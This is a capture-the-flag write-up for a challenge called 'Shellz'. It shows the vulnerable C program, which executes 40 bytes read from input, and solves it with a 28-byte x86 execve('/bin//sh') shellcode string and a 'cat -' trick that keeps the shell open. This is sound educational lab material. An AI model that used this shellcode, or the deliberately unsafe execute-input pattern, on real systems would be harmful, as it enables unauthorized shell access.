# Shellz

We are given this challenge:

![image](https://user-images.githubusercontent.com/24576987/33190548-dbfb8a04-d07b-11e7-8397-761192374564.png)

Connecting to the challenge gives us something like this:

![image](https://user-images.githubusercontent.com/24576987/33190564-f0bcc098-d07b-11e7-991d-878e8ea29fe4.png)

If we look at the source code, we can also see what's up:

```c
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <sys/mman.h>

    #define AMOUNT_OF_STUFF 40

    //Learned my lesson! No more easy flags
    /*void win(){
        system("/bin/cat ./flag.txt");    
    }*/


    void vuln(){
        char * stuff = (char *)mmap(NULL, AMOUNT_OF_STUFF, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
        if(stuff == MAP_FAILED){
            printf("Failed to get space. Please talk to admin\n");
            exit(0);
        }
        printf("Give me %d bytes:\n", AMOUNT_OF_STUFF);
        fflush(stdout);
        int len = read(STDIN_FILENO, stuff, AMOUNT_OF_STUFF);
        if(len == 0){
            printf("You didn't give me anything :(");
            exit(0);
        }
        void (*func)() = (void (*)())stuff;
        func();      
    }

    int main(int argc, char*argv[]){
        printf("My mother told me to never accept things from strangers\n");
        printf("How bad could running a couple bytes be though?\n");
        fflush(stdout);
        vuln();
        return 0;
    }
```

From this source code, we can see that there are a few interesting lines to interpret:

```
    void (*func)() = (void (*)())stuff;
    func();      
```

This is essentially creating a function pointer that points to stuff, which is a memory mapped area that was modified by the `read()` function. `func()` is then called on, suggesting that the `eip` will now point to whatever is in `stuff`.

This is strongly implying that we need to use shellcode in whatever `stuff` is. There are lots of free shellcode online, but we will use this one I found from a simple google search:

`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80`

Let's try injecting this into the remote server:

![image](https://user-images.githubusercontent.com/24576987/33190624-a27783b8-d07c-11e7-9956-ad94aa661196.png)

Hey, what gives? There was no segmentation fault, but we weren't given access to the shell? Well, it turns out that the code was properly executed, but we needed some way to return the results of our input into the server. One thing we could have done was to place `cat -` after our payload, which would read from our `stdin`. Let's do that:

![image](https://user-images.githubusercontent.com/24576987/33190644-daf8f618-d07c-11e7-963e-5e772915733f.png)

And there is our answer! We have the flag!
